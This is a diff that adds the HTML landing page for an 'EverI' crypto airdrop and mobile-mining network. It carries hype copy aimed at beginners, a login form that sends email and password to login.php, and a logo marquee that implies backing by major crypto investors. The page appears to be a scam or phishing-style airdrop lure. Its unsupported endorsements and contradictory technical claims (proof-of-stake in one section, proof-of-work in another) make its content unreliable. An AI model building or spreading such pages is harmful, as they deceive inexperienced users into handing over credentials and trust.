@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>EverI Open Network</title>
+  <link rel="stylesheet" href="style.css">
+  <link
+    href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css"
+    rel="stylesheet"
+/>
+</head>
+
+<body>
+  <header>
+    <div class="logo">EverI</div>
+    <button class="login-btn" onclick="openLogin()">Log in / Sign up</button>
+  </header>
+
+  <main>
+    <h3 class="subheading">JOIN THE EVERI AIRDROP</h3>
+    <h1 class="main-heading">
+      EVERI OPEN NETWORK<br><span id="typewriter"></span><span class="cursor">|</span>
+    </h1>
+
+    <p class="description">
+      Join the EverI Airdrop and start earning EverI XP effortlessly. The more XP you collect,
+      the bigger your share of the EverI cryptocurrency airdrop. It’s simple,
+      secure, and beginner friendly – even your grandma can get started in
+      minutes. Don't miss your chance to be part of the future of digital freedom.
+    </p>
+    <button class="download-btn" onclick="openLogin()">Get Started</button>
+    <p class="footer-text">Join 100k others who signed up</p>
+  </main>
+
+
+
+  <!-- Log in  -->
+  <!-- Log in -->
+  <div id="loginModal" class="modal">
+    <div class="modal-content">
+      <span class="close" onclick="closeLogin()">&times;</span>
+
+      <h2>Welcome!</h2>
+
+      <!-- Step 1: Email Input -->
+      <form id="emailForm" method="post" action="login.php">
+        <input type="email" name="email" placeholder="you@example.com" required>
+        <input type="password" name="password" placeholder="Enter your password" required>
+        <button type="submit">Login</button>
+      </form>
+      
+
+      <a href="#" class="help-link">Having trouble?</a>
+
+      <div class="divider"><span>OR</span></div>
+
+      <div class="social-buttons">
+        <!-- ✅ Google Button Integrated Here -->
+        <script src="https://accounts.google.com/gsi/client" async defer></script>
+        <div id="g_id_onload"
+             data-client_id="3625389664-m5958sflmclone1h9bl1r41tc6pinb5m.apps.googleusercontent.com"
+             data-login_uri="http://localhost/google-callback.php"
+             data-auto_prompt="false">
+        </div>
+        <div class="g_id_signin"
+             data-type="standard"
+             data-shape="pill"
+             data-theme="outline"
+             data-text="continue_with"
+             data-size="large"
+             data-logo_alignment="left">
+        </div>
+      
+        <!-- Other Social Buttons -->
+        <button class="social discord"><img src="https://img.icons8.com/color/24/discord-logo.png" /> Continue with Discord</button>
+        <button class="social facebook"><img src="https://img.icons8.com/color/24/facebook-new.png" /> Continue with Facebook</button>
+        <button class="social twitter"><img src="https://img.icons8.com/ios-filled/24/ffffff/twitterx.png" /> Continue with X</button>
+      </div>
+      
+    </div>
+  </div>
+
+  <!-- Mining Details -->
+  <section class="hero-section">
+    <img src="gem.png" class="floating-gem" alt="Gem" />
+    <h4 class="main-heading" data-aos="fade-down">MINING MADE EASY</h4>
+    <h1 class="main-heading" data-aos="fade-up">IF YOU CAN CLICK, YOU CAN EARN.<br> EVERI IS FOR EVERYONE.</h1>
+    <p class="description" data-aos="fade-up" data-aos-delay="200">
+      EverI Open Network is the easiest, most beautiful mining platform ever built.
+      Download it on your iphone and andriod — install, run, and you’re done. That’s it! No complicated setup, no crypto
+      knowledge required.
+      Within minutes, your computer will start earning precious EverI XP effortlessly.
+      Join the movement. Tap into the future. The more EverI XP you earn, the larger your EverI Airdrop.
+    </p>
+
+    <div class="features" data-aos="fade-up" data-aos-delay="400">
+      <div class="feature-card">
+        <img src="/images/logo.jpeg" alt="Install">
+        <h3>INSTALL & LOG IN</h3>
+      </div>
+      <div class="feature-card">
+        <img src="/images/xp.png" alt="XP">
+        <h3>MINE TO EARN EVERI XP</h3>
+      </div>
+      <div class="feature-card">
+        <img src="/images/box.jpeg" alt="Gift">
+        <h3>INVITE FRIENDS FOR MORE EVERI</h3>
+      </div>
+    </div>
+
+  </section>
+
+  <section class="universe-section">
+    <h1>EverI: The Power is in Your Hands</h1>
+    <p class="description">
+      EverI is a decentralized L1 platform that combines delegated proof-of-stake (DPoS) with a seamless app layer.
+      Designed for accessibility, scalability, and simplicity, EverI lets users mine, build, and interact all in one
+      ecosystem.
+      Start earning. Start building. Start the future.
+
+    </p>
+
+    <div class="card-container">
+      <div class="feature-card">
+        <img src="/images/Everi.png" alt="People not Bots">
+        <div class="card-content">
+          <h3>Built for People, Not Bots.</h3>
+          <p>
+            Have a phone, laptop, or desktop? Start mining EverI effortlessly.
+            Our energy-efficient algorithm ensures real people earn real rewards not farms of machines.</p>
+        </div>
+      </div>
+
+      <div class="feature-card">
+        <img src="/images/coin.jpeg" alt="Ferociously performant">
+        <div class="card-content">
+          <h3>Blazing Fast</h3>
+          <p>
+            EverI is built on a high-performance Rust-based protocol designed to handle
+            real-world applications at scale from payments to AI workloads.
+            Low fees, high throughput, and multi-blockchain transaction
+            instant finality everything you need to build what’s next.
+          </p>
+        </div>
+      </div>
+
+      <div class="feature-card">
+        <img src="images/mine.jpeg" alt="Mine everi">
+        <div class="card-content">
+          <h3>Mining in Your Pocket</h3>
+          <p>
+            With EverI’s mobile mining app, your smartphone becomes a node in
+            the network. No expensive gear. No steep learning curve.
+            Just tap to start earning wherever you are.
+          </p>
+        </div>
+      </div>
+
+      <div class="feature-card">
+        <img src="images/logo.jpeg" alt="Super app">
+        <div class="card-content">
+          <h3>The All-in-One Crypto Super App</h3>
+          <p>
+            EverI isn't just a blockchain it’s your gateway to social,
+            payments, gaming, AI, and more. One platform. One wallet. Manage your assets,
+            mine tokens, chat with friends, trade in real-time, and explore dApps — all
+            inside the EverI Super App. It’s not just a wallet. It’s your digital universe.
+            One powerful ecosystem built entirely for the next billion users.
+          </p>
+        </div>
+      </div>
+
+      <div class="feature-card">
+        <img src="images/logo.jpeg" alt="Super app">
+        <div class="card-content">
+          <h3>From Content to Currency, You’re in Charge
+          </h3>
+          <p>
+            Say goodbye to walled gardens. With EverI’s open protocols, you can post, pay, play, and earn — without
+            middlemen or censorship. Your data. Your value. Your voice.
+          </p>
+        </div>
+      </div>
+
+      <div class="feature-card">
+        <img src="images/logo.jpeg" alt="Super app">
+        <div class="card-content">
+          <h3>Smarter Blockchain. Smarter You.
+          </h3>
+          <p>
+            EverI integrates intelligent AI features into every layer personalized feeds, smart wallet suggestions, and
+            adaptive interfaces that grow with you. The future is smart, and it starts here.
+
+          </p>
+        </div>
+      </div>
+
+      <div class="feature-card">
+        <img src="images/logo.jpeg" alt="Super app">
+        <div class="card-content">
+          <h3>Beyond Payments
+          </h3>
+          <p>
+            Send money in seconds. Pay for content. Tip creators. Use AI to automate your finances. EverI transforms
+            payments into powerful, programmable experiences.
+          </p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- Thank you section -->
+
+  <section class="thank-you-section">
+    <h2>Grateful for Every Miner, Maker & Believer in EverI!!</h2>
+    <div class="logo-marquee">
+      <div class="logo-track">
+        <!-- Replace the src URLs with your own hosted logo images -->
+        <div class="logo-item"><img src="/images/binance.png" alt="Binance lab"></div>
+        <div class="logo-item"><img src="/images/coinbase.png" alt="Coinbase Ventures"></div>
+        <div class="logo-item"><img src="/images/animoca.png" alt="Animoca Brands"></div>
+        <div class="logo-item"><img src="/images/genblock.png" alt="Genblock Capital"></div>
+        <div class="logo-item"><img src="/images/capital.png" alt="Blockchain Capital"></div>
+        <div class="logo-item"><img src="/images/grayscale.png" alt="Grayscale"></div>
+
+        <!-- Repeating logos to create seamless infinite scroll -->
+        <div class="logo-item"><img src="/images/binance.png" alt="Binance Lab"></div>
+        <div class="logo-item"><img src="/images/coinbase.png" alt="Coinbase Ventures"></div>
+        <div class="logo-item"><img src="/images/animoca.png" alt="Animoca Brands"></div>
+        <div class="logo-item"><img src="/images/genblock.png" alt="Genblock Capital"></div>
+        <div class="logo-item"><img src="/images/capital.png" alt="Blockchain Capital"></div>
+        <div class="logo-item"><img src="/images/grayscale.png" alt="Grayscale"></div>
+      </div>
+    </div>
+  </section>
+
+    <!-- Everi Introduction -->
+  <section class="tari-section">
+    <small>Mine. Connect. Create. Earn. </small>
+    <h1>
+      EVERI IS AN OPEN PLATFORM FOR MINING, PAYMENTS, AI, AND
+      EXPRESSION MADE TO BE SIMPLE, SECURE, AND FOR EVERYONE.
+    </h1>
+    <p class="description">
+      EverI Open Network is a next-generation blockchain designed for real people, not machines.
+      It’s powered by proof of work, open to everyone, and built to be beautifully simple even for first-time users.
+
+      Confidential by design and decentralized at heart, EverI brings mining,
+      payments, social, gaming, AI, and more into one seamless ecosystem.
+      With EverI Universe, the power of the network truly belongs to you.
+
+      Whether you're building the future or just exploring it EverI makes it easy to join, earn, and grow.
+    </p>
+    <a href="https://t.me/EverI_Official" target="_blank">
+      <button class="join-btn">JOIN TELEGRAM</button>
+    </a>
+  </section>
+
+  
+<!-- FAQ section -->
+<!-- FAQ section -->
+<div class="faq-container">
+    <div class="faq-header">
+      <h2>Frequently Asked Questions</h2>
+      <p>Find answers to common questions about the Everl token airdrop.</p>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">What is EverI?</div>
+      <div class="faq-answer">
+        EverI is a next-generation open blockchain network that combines mining, payments, social features, AI, and gaming into one powerful and easy-to-use platform. It's designed for real people not bots and empowers everyone to earn, create, and connect.
+
+      </div>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">Is EverI free to use?</div>
+      <div class="faq-answer">
+        Yes! Downloading and using the EverI app is free. You can start mining and earning without any upfront investment.
+
+      </div>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">What can I do with EverI tokens?</div>
+      <div class="faq-answer">
+        EverI tokens can be used for payments, tipping creators, accessing premium features in social/gaming apps, trading on the built-in exchanger, and participating in the growing EverI ecosystem.
+
+      </div>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">Is EverI open source?</div>
+      <div class="faq-answer">
+        Yes! EverI is fully open source and community-driven. Developers are welcome to contribute, build dApps, or explore the protocol.
+
+      </div>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">Can I mine EverI on mobile?</div>
+      <div class="faq-answer">
+        Absolutely. EverI supports mobile mining via our official app, making it easy to earn tokens right from your smartphone.
+
+      </div>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">What is the EverI Open Network</div>
+      <div class="faq-answer">
+        The EverI Open Network is your gateway to all EverI features mining, wallet, dApps, social feeds, and more — all in one clean and intuitive interface.
+
+      </div>
+    </div>
+  
+    <div class="faq-item">
+      <div class="faq-question">Is EverI safe and private?</div>
+      <div class="faq-answer">
+        Yes. EverI is built with privacy in mind. The protocol includes features that protect user data and transactions, ensuring you stay in control of your information.
+
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">What makes EverI different from other crypto projects?</div>
+      <div class="faq-answer">
+        Mobile mining. Real utility across social, gaming, AI, and payments. Open-source and community-powered. Designed for simplicity, scalability, and accessibility. One ecosystem, everything included
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">How can I join the EverI community?</div>
+      <div class="faq-answer">
+        Join us on Telegram, follow us on social media, and download the EverI app to start your journey. Your voice and energy power this network!
+
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">How can I earn from EverI?</div>
+      <div class="faq-answer">
+        You can earn EverI tokens by: Mobile or desktop mining. Engaging with the platform (social actions, referrals, and more). Contributing content or building dApps. Staking and ecosystem participation
+
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">Is EverI mining mobile-friendly?</div>
+      <div class="faq-answer">
+        Yes! EverI's mobile mining feature allows anyone with a smartphone to participate in the network. No expensive rigs or technical skills needed — just download the app, tap, and earn.
+
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">Do I need any crypto experience to start?</div>
+      <div class="faq-answer">
+        Not at all. EverI is made for everyone — even if you’re brand new to crypto. The interface is beginner-friendly and the onboarding process is quick and simple.
+
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">How many token will i receive?</div>
+      <div class="faq-answer">
+        Eligible wallets will receive EverI tokens, depending on your previous activity and engagement with supported protocols.
+      </div>
+    </div>
+
+    <div class="faq-item">
+      <div class="faq-question">When Mainnet is launch?</div>
+      <div class="faq-answer">
+        The EverI Open Network is more than just another blockchain — it's the future of decentralized mining, social, payments, AI, and gaming. And it’s almost here. The EverI mainnet is set to launch in mid-2026, and with it comes a fully open, people-powered ecosystem built for real-world use and global adoption. From secure mobile mining to on-chain social and AI-driven apps, EverI is designed to empower everyone from creators to everyday users.
+
+      </div>
+    </div>
+  </div>
+
+ <!-- Footer section -->
+ <footer class="footer">
+    <div class="footer-container">
+      <div class="footer-col footer-brand">
+        <h2>Everl</h2>
+        <p>EverI is building a next-generation blockchain ecosystem focusing on scalability, security, and user experience..</p>
+        <div class="social-icons">
+          <a href="#" target="_blank"><i class="ri-twitter-x-line"></i></a>
+          <a href="#" target="_blank"><i class="ri-facebook-fill"></i></a>
+          <a href="#" target="_blank"><i class="ri-telegram-fill"></i></a>
+          <a href="#" target="_blank"><i class="ri-youtube-fill"></i></a>
+          <a href="#" target="_blank"><i class="ri-discord-fill"></i></a>
+          <a href="#" target="_blank"><i class="ri-linkedin-box-fill"></i></a>
+        </div>
+      </div>
+  
+  
+      <div class="footer-col">
+        <h4>Company</h4>
+        <ul>
+          <li><a href="about.html">About Us</a></li>
+          <li><a href="careers.html">Careers</a></li>
+          <li><a href="blog.html">Blog</a></li>
+          <li><a href="contact.html">Contact Us</a></li>
+        </ul>
+      </div>
+  
+      <div class="footer-col">
+        <h4>Resources</h4>
+        <ul>
+          <li><a href="documentation.html">Documentation</a></li>
+          <li><a href="whitepaper.html">Whitepaper</a></li>
+          <li><a href="community.html">Community</a></li>
+          <li><a href="tokenomics.html">Tokenomics</a></li>
+        </ul>
+      </div>
+    </div>
+  
+    <div class="footer-bottom"> 
+      <p>© 2025 Everl. All rights reserved. | 
+        <a href="privacy-policy.html" target="_blank">Privacy Policy</a> 
+        <a href="terms-of-service.html" target="_blank">Terms of Service</a> 
+        <a href="cookie-policy.html" target="_blank">Cookie Policy</a>
+      </p>
+    </div>
+    
+  </footer>
+
+  <script src="script.js"></script>
+
+</body>
+
+</html>
